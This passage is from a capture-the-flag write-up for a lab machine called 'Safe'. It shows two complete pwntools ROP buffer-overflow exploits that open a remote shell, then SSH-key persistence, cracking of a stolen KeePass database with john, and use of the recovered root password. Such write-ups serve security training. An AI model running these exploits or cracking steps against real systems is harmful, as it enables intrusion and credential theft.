[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)

```

#### Method 2: Write /bin/sh

Since I already have access to `system` and `gets`, and all I’m missing is the string `/bin/sh`. So if I can just write that string into memory somewhere that will be statically addressed, then I’m good.

When I look in IDA, I can see the `.data` section is marked Read/Write:

![1571340084992](https://0xdfimages.gitlab.io/img/1571340084992.png)

So I’ll have my ROP call `gets(0x404038)`, send “/bin/sh\x00” to be read by `gets`, and then `system(0x404038)`.

That will look like:

```

#!/usr/bin/env python

from pwn import *

context(os="linux", arch="amd64")
#context(log_level='DEBUG')

junk = "A"*120

plt_gets = p64(0x401060)
plt_system = p64(0x401040)
pop_rdi = p64(0x40120b)
binsh = p64(0x404038)

payload = junk + pop_rdi + binsh + plt_gets + pop_rdi + binsh + plt_system

p = remote("10.10.10.147", 1337)
p.recvline()
p.sendline(payload)
p.sendline('/bin/sh\x00')
p.interactive()

```

And it gets a shell:

```

root@kali# ./pwn_safe-m2.py 
[+] Opening connection to 10.10.10.147 on port 1337: Done
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)

```

#### Method 3: test

The third method relies on the `test()` function that is never called but is still in the code:

```

gdb-peda$ disassemble test 
Dump of assembler code for function test:
   0x0000000000401152 <+0>:     push   rbp
   0x0000000000401153 <+1>:     mov    rbp,rsp
   0x0000000000401156 <+4>:     mov    rdi,rsp
   0x0000000000401159 <+7>:     jmp    r13
   0x000000000040115c <+10>:    nop
   0x000000000040115d <+11>:    pop    rbp
   0x000000000040115e <+12>:    ret    
End of assembler dump.

```

If I can get the address of `system` into R13 and `/bin/sh` onto the top of the stack, then calling `test()` will give a shell. I’ll use `ropper` to find a gadget to POP R13:

```

root@kali# ropper -f myapp | grep r13
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x0000000000401204: pop r12; pop r13; pop r14; pop r15; ret; 
0x0000000000401206: pop r13; pop r14; pop r15; ret; 
0x0000000000401203: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x0000000000401205: pop rsp; pop r13; pop r14; pop r15; ret; 

```

The second one works, and I’ll just pop nulls in to R14 and R15. The rest of the addresses I can get from the previous examples, to create this exploit:

```

#!/usr/bin/env python

from pwn import *

context(os="linux", arch="amd64")

binsh = "/bin/sh\x00"
junk = "A"*(120 - len(binsh))
plt_system = p64(0x401040)
test = p64(0x401152)
pop_r13_r14_r15 = p64(0x401206)

payload = junk + binsh + pop_r13_r14_r15 + plt_system + p64(0) + p64(0) + test

p = remote("10.10.10.147", 1337)
p.recvline()
p.sendline(payload)
p.interactive()

```

And it also gets a shell:

```

root@kali# ./pwn_safe-m3.py 
[+] Opening connection to 10.10.10.147 on port 1337: Done
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)

```

### Flag

With any of the three shells, I can grab `user.txt`:

```

$ cat /home/user/user.txt
7a29ee9b...

```

### Shell Upgrade

The box is quite bare. No `python`, `python3`, `nc`. But ssh is listening, so I’ll drop my public key into the `authorized_keys` file and connect over ssh to get a full shell:

```

root@kali# cat ~/id_rsa_generated.pub | base64 -w0
c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQ...[snip]...

```

```

$ echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQ...[snip]... | base64 -d >> /home/user/.ssh/authorized_keys

```

Now I can ssh in:

```

root@kali# ssh -i ~/id_rsa_generated user@10.10.10.147
The authenticity of host '10.10.10.147 (10.10.10.147)' can't be established.
ECDSA key fingerprint is SHA256:SLbYsnF/xaUQIxRufe8Ux6dZJ9+Jler9PTISUR90xkc.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.147' (ECDSA) to the list of known hosts.
Linux safe 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1 (2019-04-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jul 27 16:55:57 2019 from 10.10.14.6
user@safe:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)

```

## Priv: user –> root

### Enumeration

In the home directory, there’s a few files besides `user.txt`:

```

user@safe:~$ ls
IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG  myapp  MyPasswords.kdbx  user.txt

```

I’ll use `scp` to pull them back:

```

root@kali# scp -i ~/id_rsa_generated user@10.10.10.147:~/IMG* .
IMG_0545.JPG                                                       100% 1863KB 944.7KB/s   00:01    
IMG_0546.JPG                                                       100% 1872KB   1.6MB/s   00:01    
IMG_0547.JPG                                                       100% 2470KB   2.0MB/s   00:01    
IMG_0548.JPG                                                       100% 2858KB   1.5MB/s   00:01    
IMG_0552.JPG                                                       100% 1099KB   1.6MB/s   00:00    
IMG_0553.JPG                                                       100% 1060KB   2.3MB/s   00:00    
root@kali# scp -i ~/id_rsa_generated user@10.10.10.147:~/*.kdbx .
MyPasswords.kdbx                                                   100% 2446    61.1KB/s   00:00

```

### Cracking

I used this one liner to create a file with seven hashes: one for the database by itself, and then one each for the database with each of the six images as keyfiles:

```

root@kali# /opt/john/run/keepass2john MyPasswords.kdbx > MyPasswords.kdbx.john; for img in $(ls IMG*); do /opt/john/run/keepass2john -k $img MyPasswords.kdbx; done >> MyPasswords.kdbx.john

root@kali# cat MyPasswords.kdbx.john 
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*17c3509ccfb3f9bf864fca0bfaa9ab137c7fca4729ceed90907899eb50dd88ae
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*a22ce4289b755aaebc6d4f1b49f2430abb6163e942ecdd10a4575aefe984d162
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*d86a22408dcbba156ca37e6883030b1a2699f0da5879c82e422c12e78356390f
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*facad4962e8f4cb2718c1ff290b5026b7a038ec6de739ee8a8a2dd929c376794
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*7c83badcfe0cd581613699bb4254d3ad06a1a517e2e81c7a7ff4493a5f881cf2

```

Running that into `john` with the `rockyou-30` subset of rockyou because this is a slow crack returns a success:

```

root@kali# /opt/john/run/john MyPasswords.kdbx.john /usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt 
Warning: only loading hashes of type "KeePass", but also saw type "tripcode"
Use the "--format=tripcode" option to force loading hashes of that type instead
Warning: only loading hashes of type "KeePass", but also saw type "descrypt"
Use the "--format=descrypt" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (KeePass [SHA256 AES 32/64 OpenSSL])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bullshit         (MyPasswords)
1g 0:00:01:20 0.47% 2/3 (ETA: 15:46:09) 0.01239g/s 91.21p/s 154.1c/s 154.1C/s emerald..francesco
Use the "--show" option to display all of the cracked passwords reliably
Session aborted

```

Once one cracks, I can kill it as the others won’t.

### Explore DB

With the password, I can try each of the image files until I get one that opens the database. I can look into the password database using the command line tool, `kpcli`. In the keepass database, I’ll find the “Root password”:

```

root@kali# kpcli --key IMG_0547.JPG --kdb MyPasswords.kdbx
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> ls
=== Groups ===
MyPasswords/
kpcli:/> cd MyPasswords/
kpcli:/MyPasswords> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/
=== Entries ===
0. Root password
kpcli:/MyPasswords> show -f R
Recycle\ Bin/   Root\ password
kpcli:/MyPasswords> show -f Root\ password

 Path: /MyPasswords/
Title: Root password
Uname: root
 Pass: u3v2249dl9ptv465cogl3cnpo3fyhk
  URL:
Notes:

```

### Shell as root

I can run `su -` and enter that password to get a root shell:

```

user@safe:~$ su -
Password:
root@safe:~# id
uid=0(root) gid=0(root) groups=0(root)

```

Then I can grab `root.txt`:

```

root@safe:~# cat root.txt 
d7af235e...

```